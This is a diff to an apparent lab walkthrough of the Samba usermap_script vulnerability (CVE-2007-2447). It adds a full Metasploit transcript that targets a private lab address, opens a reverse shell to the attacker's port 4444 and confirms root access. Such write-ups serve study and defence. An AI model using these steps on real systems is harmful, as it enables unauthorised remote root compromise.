@@ -82,7 +82,47 @@ Now you can execute commands and see that we've owned the machine! As I mentione
 
 Load Metasploit using `msfconsole` then run `use exploit/multi/samba/usermap_script` this will tell Metasploit to use that module, next you will need to set the `rhost` with the IP address of your target, you don't need to specify another payload for the bind shell as the Metasploit module will do this for you on your machines IP & port 4444. That's it! You now have a shell with whatever privliges the account Samba is running on has.
 
-![Metasploit Example](/assets/images/cve2007-2447/username%20map%20script%20msf.png)
+```
+msf > use exploit/multi/samba/usermap_script
+msf exploit(multi/samba/usermap_script) > show options
+
+Module options (exploit/multi/samba/usermap_script):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  139              yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(multi/samba/usermap_script) > set RHOST 192.168.139.133
+RHOST => 192.168.139.133
+msf exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP double handler on 192.168.139.135:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo iogIbtev3qMtahR5;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "iogIbtev3qMtahR5\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.139.135:4444 -> 192.168.139.133:44662) at 2018-11-17 15:35:19 +0000
+
+id;
+uid=0(root) gid=0(root)
+whoami;
+root
+```
 
 
 ### Python Exploitation
